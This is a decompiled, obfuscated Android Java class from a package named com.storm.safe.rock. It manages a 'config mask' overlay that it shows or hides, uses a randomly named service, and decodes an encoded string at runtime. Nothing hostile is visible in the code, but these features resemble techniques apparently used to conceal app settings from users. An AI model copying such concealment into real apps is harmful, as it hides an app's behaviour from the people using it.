package p000;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.util.StringUtil;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: km */
/* loaded from: classes2.dex */
public final class C0763km {

    /* renamed from: a3 */
    public static final String f57542a3;

    /* renamed from: a0 */
    public final dqtvuisjd f57543a0;

    /* renamed from: a1 */
    public final Context f57544a1;

    /* renamed from: a2 */
    public C0708j7 f57545a2;

    static {
        new C0762kl(null);
        f57542a3 = StringUtil.m212470a0("OFwDLEgqMy1YPy1QFnRHKwMg");
    }

    public C0763km(dqtvuisjd dqtvuisjdVar, dqtvuisjd dqtvuisjdVar2) {
        t60.m214695b6(dqtvuisjdVar, "service");
        t60.m214695b6(dqtvuisjdVar2, "context");
        this.f57543a0 = dqtvuisjdVar;
        this.f57544a1 = dqtvuisjdVar2;
    }

    /* renamed from: a0 */
    public final void m213600a0() {
        try {
            C0708j7 c0708j7 = this.f57545a2;
            if (c0708j7 != null) {
                c0708j7.f57287b2 = false;
                if (c0708j7.f57278a3) {
                    if (t60.m214686a2(Looper.myLooper(), Looper.getMainLooper())) {
                        c0708j7.m213213a2();
                    } else {
                        new Handler(Looper.getMainLooper()).post(new RunnableC0704j3(c0708j7, 2));
                    }
                }
            }
        } catch (Exception e) {
            t60.m214705c6("ConfigMaskManager", "❌ 隐藏配置遮盖失败", e);
        }
    }

    /* renamed from: a1 */
    public final void m213601a1(boolean z) {
        try {
            C0708j7 c0708j7 = this.f57545a2;
            if (c0708j7 == null) {
                t60.m214704c5("ConfigMaskManager", "❌ maskManager为null，无法显示遮盖");
            } else {
                c0708j7.f57286b1 = z;
                c0708j7.m213214a3();
            }
        } catch (Exception e) {
            t60.m214705c6("ConfigMaskManager", "❌ 显示配置遮盖失败", e);
        }
    }
}
